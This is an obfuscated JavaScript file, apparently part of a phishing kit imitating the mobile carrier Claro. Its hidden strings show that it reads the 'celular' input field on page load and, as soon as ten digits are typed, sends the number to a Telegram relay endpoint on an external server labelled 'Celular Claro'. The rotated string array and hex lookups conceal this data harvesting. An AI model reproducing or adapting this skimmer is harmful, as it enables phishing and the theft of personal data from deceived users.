const _0x1aa971 = _0x59fb;
function _0x59fb(_0x301987, _0x2aa0df) {
  const _0xf9310b = _0xf931();
  return (
    (_0x59fb = function (_0x59fb9, _0x3de081) {
      _0x59fb9 = _0x59fb9 - 0x13b;
      let _0x6cc5a6 = _0xf9310b[_0x59fb9];
      return _0x6cc5a6;
    }),
    _0x59fb(_0x301987, _0x2aa0df)
  );
}
(function (_0x8b8f98, _0x4349a8) {
  const _0x3ef711 = _0x59fb,
    _0x4d9ac9 = _0x8b8f98();
  while (!![]) {
    try {
      const _0x51b0c3 =
        (parseInt(_0x3ef711(0x14c)) / 0x1) *
          (-parseInt(_0x3ef711(0x14a)) / 0x2) +
        -parseInt(_0x3ef711(0x13c)) / 0x3 +
        (parseInt(_0x3ef711(0x156)) / 0x4) *
          (-parseInt(_0x3ef711(0x155)) / 0x5) +
        (-parseInt(_0x3ef711(0x146)) / 0x6) *
          (-parseInt(_0x3ef711(0x14e)) / 0x7) +
        (parseInt(_0x3ef711(0x154)) / 0x8) *
          (parseInt(_0x3ef711(0x140)) / 0x9) +
        (parseInt(_0x3ef711(0x13b)) / 0xa) *
          (-parseInt(_0x3ef711(0x145)) / 0xb) +
        parseInt(_0x3ef711(0x14d)) / 0xc;
      if (_0x51b0c3 === _0x4349a8) break;
      else _0x4d9ac9["push"](_0x4d9ac9["shift"]());
    } catch (_0x564fd3) {
      _0x4d9ac9["push"](_0x4d9ac9["shift"]());
    }
  }
})(_0xf931, 0x4d988);
let messageSent = ![];
function _0xf931() {
  const _0x592c63 = [
    "🔴\x20Celular\x20Claro:\x20",
    "605IfzJYZ",
    "23886lTpJtM",
    "value",
    "POST",
    "addEventListener",
    "56nVbQZJ",
    "DOMContentLoaded",
    "21865hbhTLP",
    "8930484KhRaSR",
    "315ajwiir",
    "error",
    "/telegram/send_message",
    "celular",
    "input",
    "Mensaje\x20enviado\x20correctamente:\x20",
    "4288BRVohN",
    "18995KtZSnA",
    "80AOWMzm",
    "69410eDgLCt",
    "348159Krcvmi",
    "application/json",
    "log",
    "json",
    "9747eEXCtt",
    "getElementById",
    "Error\x20al\x20enviar\x20el\x20mensaje:",
    "Error:",
  ];
  _0xf931 = function () {
    return _0x592c63;
  };
  return _0xf931();
}
async function sendToTelegram() {
  const _0x585dd7 = _0x59fb,
    _0x2b333a = document[_0x585dd7(0x141)](_0x585dd7(0x151)),
    _0x263dca = _0x2b333a[_0x585dd7(0x147)];
  if (_0x263dca["length"] === 0xa && !messageSent) {
    messageSent = !![];
    try {
      const _0x4c0422 = await fetch(url + _0x585dd7(0x150), {
        method: _0x585dd7(0x148),
        headers: { "Content-Type": _0x585dd7(0x13d) },
        body: JSON["stringify"]({ message: _0x585dd7(0x144) + _0x263dca }),
      });
      _0x4c0422["ok"]
        ? console[_0x585dd7(0x13e)](_0x585dd7(0x153) + _0x263dca)
        : console[_0x585dd7(0x14f)](
            _0x585dd7(0x142),
            await _0x4c0422[_0x585dd7(0x13f)]()
          );
    } catch (_0x4cf81e) {
      console["error"](_0x585dd7(0x143), _0x4cf81e);
    } finally {
      messageSent = ![];
    }
  }
}
document[_0x1aa971(0x149)](_0x1aa971(0x14b), function () {
  const _0x5a933c = _0x1aa971,
    _0x11fba3 = document[_0x5a933c(0x141)](_0x5a933c(0x151));
  _0x11fba3["addEventListener"](_0x5a933c(0x152), sendToTelegram);
});
